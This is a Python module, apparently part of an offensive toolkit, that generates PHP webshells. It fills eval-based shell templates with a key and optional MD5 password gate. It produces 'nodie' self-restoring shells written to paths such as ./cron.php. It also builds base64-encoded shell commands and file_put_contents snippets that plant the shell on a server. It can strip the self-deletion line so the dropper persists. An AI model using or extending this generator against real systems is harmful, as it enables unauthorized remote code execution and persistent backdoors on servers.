from . import encoder
from os.path import dirname
import random

class Webshell:
    def __init__(self,key) -> None:
        self.key = key
        self.passwd = None
        self.location = None
        self.dir = dirname(__file__)

    def command_to_write(self,php,location,nodie=False):
        self.location = location
        command = ""
        if nodie:
            with open(f"{self.dir}/webshell/write_nodie_webshell.sh") as f:
                write_webshell_sh = f.read()
            command = write_webshell_sh.replace("8888",encoder.base64_encode(php))
            command = command.replace("9999",location)
        else:
            with open(f"{self.dir}/webshell/write_webshell.sh") as f:
                write_webshell_sh = f.read()
            command = write_webshell_sh.replace("8888",encoder.base64_encode(php))
            command = command.replace("9999",location)
        return command
    
    @staticmethod
    def get_random_string(num:int):
        return random.randbytes(random.randint(1,num)).hex()
    @staticmethod
    def get_random_string_len_fixed(num:int):
        return random.randbytes(num).hex()

class PHP(Webshell):
    def __init__(self, key) -> None:
        super().__init__(key)
    
    def rawcode(self,php:str):
        start = php.find("<?php")
        end = php.rfind("?>")
        if start == -1:
            return php
        return php[start + 5:end]

    def password(self,passwd,php):
        self.passwd = passwd
        raw = self.rawcode(php)
        with open(f"{self.dir}/webshell/passwd.php") as f:
            passwd_php = f.read()
        code = passwd_php.replace("8888",encoder.md5(bytes(passwd,"utf-8")))
        code = code.replace("9999",raw)
        return code
    
    def generate(self,passwd=None):
        with open(f"{self.dir}/webshell/eval.php") as f:
            eval_php = f.read()
        code = eval_php.replace("9999","'" + self.key + "'")
        if passwd:
            code = self.password(passwd=passwd,php=code)
        return code

    def nodiephp(self,php,location="./cron.php"):
        self.location = location
        with open(f"{self.dir}/webshell/nodie.php") as f:
            nodie_php = f.read()
        code = nodie_php.replace("8888",encoder.base64_encode(php))
        code = code.replace("9999",location)
        return code

    def fatter(self,php):
        raw = self.rawcode(php)
        with open(f"{self.dir}/webshell/fatter.php") as f:
            fatter_php = f.read()
        code = fatter_php.replace("9999",raw)
        return code
    def code_to_write(self,php,location):
        self.location = location
        with open(f"{self.dir}/webshell/file_put_contents.php") as f:
            file_put_contents_php = f.read()
        code = file_put_contents_php.replace("8888",encoder.base64_encode(php))
        code = code.replace("9999",location)
        return self.rawcode(code)
    
    def code_to_write_nodie(self,php,location="./cron.php"):
        nodiephp = self.nodiephp(php=php,location=location)
        nodiephp = nodiephp.replace("\nunlink(__FILE__);","")
        return self.rawcode(nodiephp)
